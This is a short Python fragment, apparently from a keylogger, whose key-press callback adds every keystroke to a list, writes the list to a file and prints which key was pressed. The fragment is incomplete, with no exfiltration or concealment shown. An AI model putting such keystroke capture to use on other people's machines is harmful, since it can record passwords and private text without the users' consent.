def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))